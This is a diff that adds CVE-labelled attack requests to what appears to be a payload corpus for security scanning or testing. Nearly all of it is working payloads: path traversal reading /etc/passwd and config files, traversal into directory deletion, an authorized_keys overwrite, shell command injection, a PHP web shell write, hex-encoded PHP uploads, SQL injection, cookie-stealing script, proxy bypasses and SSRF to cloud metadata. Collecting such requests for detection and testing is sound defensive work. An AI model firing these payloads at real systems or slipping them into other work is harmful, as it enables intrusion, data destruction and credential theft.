@@ -5033,3 +5033,54 @@ POST /mcp header="Content-Type: application/json" body="{\"jsonrpc\":\"2.0\",\"i
 #     the download directory without confinement; a traversal escapes it. ---
 GET /api?mode=status&name=delete_orphan&value=../../config/sabnzbd.ini
 GET /api?mode=status&name=delete_orphan&value=..%2F..%2Fconfig%2Fsabnzbd.ini
+
+# --- CVE-2026-120444 (GoFound): the database parameter is joined onto the
+#     data directory and passed to os.RemoveAll without path confinement. ---
+GET /api/db/create?database=..%2F..%2F..%2F..%2Fsrv%2Fbackup
+GET /api/db/drop?database=..%2F..%2F..%2F..%2Fsrv%2Fbackup
+
+# --- CVE-2026-120322 (Termix): transferToHost classifies a caller-recorded
+#     loopback destination as local and writes an attacker-chosen absolute
+#     destPath onto the Termix host. ---
+POST /plugin-api/file-manager/transferToHost header="Content-Type: application/json" body="{\"sourceSessionId\":\"S2\",\"destSessionId\":\"S1\",\"sourcePaths\":[\"/root/pwn.tmxplug\"],\"destPath\":\"/app/data/plugins/pwn.tmxplug\"}"
+POST /plugin-api/file-manager/transferToHost header="Content-Type: application/json" body="{\"sourceSessionId\":\"S2\",\"destSessionId\":\"S1\",\"sourcePaths\":[\"/root/.ssh/authorized_keys\"],\"destPath\":\"/root/.ssh/authorized_keys\"}"
+
+# --- CVE-2026-73695 / CVE-2026-73697 / CVE-2026-77876 (Control Web Panel):
+#     the user panel concatenates the module parameter into an include path,
+#     the phpini editor writes caller paths and passes labels to shell_exec,
+#     and protected_directory passes the file parameter to shell_exec. ---
+GET /user/index.php?module=../../../../etc/passwd
+GET /user/index.php?module=..%2F..%2F..%2F..%2Fetc%2Fpasswd
+POST /user/index.php header="Content-Type: application/x-www-form-urlencoded" body="module=protected_directory&acc=deletedp&file=;id"
+POST /user/index.php header="Content-Type: application/x-www-form-urlencoded" body="module=phpini_editor&acc=addlabelphpiniadv&label=memory_limit;id"
+POST /user/index.php header="Content-Type: application/x-www-form-urlencoded" body="module=phpini_editor&acc=update&path=../../../../var/www/html/shell.php&content=%3C%3Fphp%20system(%24_GET%5B0%5D)%3B%20%3F%3E"
+
+# --- CVE-2026-105604 (Joomla DJ-Classifieds): the frontend search concatenates
+#     caller input into the SQL statement without authentication. ---
+GET /index.php?option=com_djclassifieds&view=items&search=1%27%20AND%20(SELECT%20SLEEP(5))%20--%20-
+GET /index.php?option=com_djclassifieds&view=items&search=1%27%20UNION%20SELECT%201,2,3%20--%20-
+
+# --- CVE-2026-105603 / CVE-2026-105606 (Joomla DJ-Classifieds and Custom
+#     Tables): unprivileged and unauthenticated submission forms accept an
+#     attacker-chosen executable extension. ---
+POST /index.php?option=com_djclassifieds&task=item.add header="Content-Type: multipart/form-data; boundary=X" bodyhex=2d2d580d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2275706c6f6164223b2066696c656e616d653d227368656c6c2e706870220d0a436f6e74656e742d547970653a20696d6167652f6769660d0a0d0a4749463839613c3f706870206563686f20313b203f3e0d0a2d2d582d2d0d0a
+POST /index.php?option=com_customtables&task=form.save header="Content-Type: multipart/form-data; boundary=X" bodyhex=2d2d580d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2266696c65223b2066696c656e616d653d22706f6c79676c6f742e706870220d0a436f6e74656e742d547970653a206170706c69636174696f6e2f6f637465742d73747265616d0d0a0d0a3c3f706870206563686f20313b203f3e0d0a2d2d582d2d0d0a
+
+# --- CVE-2026-111048 (FOSSBilling): the note parameter is stored and rendered
+#     through innerHTML in the admin support ticket list. ---
+POST /admin/support/note_create header="Content-Type: application/x-www-form-urlencoded" body="ticket_id=1&note=<script>alert(document.cookie)</script>"
+
+# --- CVE-2026-117518 / CVE-2026-120213 (@fastify/reply-from and http-proxy):
+#     backslash and percent-encoded dot-segments bypass the proxy prefix check,
+#     and URL-decoded route parameters rewrite the upstream path. ---
+GET /proxy/%5c..%5c..%5cadmin
+GET /proxy/tenant%2F..%2Fadmin
+
+# --- CVE-2026-88809 (SUSE Rancher): the /meta/proxy allowlist decision cannot
+#     stop the request from reaching an internal destination. ---
+GET /meta/proxy?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F
+GET /meta/proxy?url=https%3A%2F%2F127.0.0.1%3A6443%2F
+
+# --- CVE-2026-120426 (OpenCSG CSGHub): a percent-encoded current_user query
+#     is injected into the unauthenticated file resolve path. ---
+GET /models/private/resolve/main/config.json%3Fcurrent_user=admin
